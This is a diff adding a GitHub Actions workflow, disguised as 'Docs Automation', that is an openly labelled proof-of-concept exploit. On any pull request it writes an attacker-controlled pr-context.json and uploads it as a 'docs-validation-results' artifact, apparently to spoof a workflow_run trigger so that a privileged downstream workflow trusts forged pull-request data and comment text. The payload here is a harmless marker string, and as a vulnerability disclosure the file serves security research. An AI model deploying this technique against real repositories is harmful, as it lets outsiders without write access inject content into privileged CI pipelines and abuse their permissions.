@@ -1,0 +1,36 @@
+---
+name: Docs Automation
+on:  # yamllint disable-line rule:truthy
+  pull_request:
+
+permissions: {}
+
+jobs:
+  forge:
+    name: Forge PR context artifact
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create attacker-controlled pr-context.json
+        env:
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          REPO: ${{ github.repository }}
+        run: |
+          python3 - <<'PY'
+          import json, os
+          owner, name = os.environ["REPO"].split("/", 1)
+          ctx = {
+              "pr_number": int(os.environ["PR_NUMBER"]),
+              "repo_owner": owner,
+              "repo_name": name,
+              "head_sha": "0" * 40,
+              "comment_body": "FORGED-ARTIFACT-POC: this comment body was fully attacker-controlled via workflow_run name spoofing (attacker has no write access).",
+          }
+          open("pr-context.json", "w").write(json.dumps(ctx))
+          PY
+
+      - name: Upload forged artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: docs-validation-results-${{ github.run_id }}
+          path: pr-context.json
+          retention-days: 1
